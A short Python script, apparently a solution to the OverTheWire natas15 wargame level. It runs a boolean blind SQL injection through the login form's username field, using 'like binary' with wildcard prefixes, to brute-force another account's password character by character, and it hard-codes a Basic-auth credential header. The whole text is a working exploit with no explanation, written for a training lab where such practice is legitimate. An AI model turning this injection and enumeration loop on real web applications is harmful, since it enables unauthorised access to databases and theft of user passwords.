#! /bin/python3

import requests
import re
#import urllib.parse

def urlconn(var) :
    url = 'http://natas15.natas.labs.overthewire.org/index.php'
    headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
    stand = 'natas16" and password like binary "'
    username = stand + var
    #userenc = urllib.parse.quote_plus(username,encoding='utf-8',errors=None)
    #print (userenc)
    payload = {'username': username}

    r = requests.post(url,headers=headers,data=payload)

    #print (r.text)

    return (re.findall('doesn\'t', r.text, re.MULTILINE))

lst = 'abcdefghijklmnopqrstuvwxyz123334567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'

str1 = '%'

str2 = ''

for i in range(1,33) :
    for j in lst :
        teststr = str2 + j + str1
        print (teststr)
        result = urlconn(teststr)
        #print (result)
        if result != ['doesn\'t'] :
            str2 = str2 + j
            break
    print (str1)
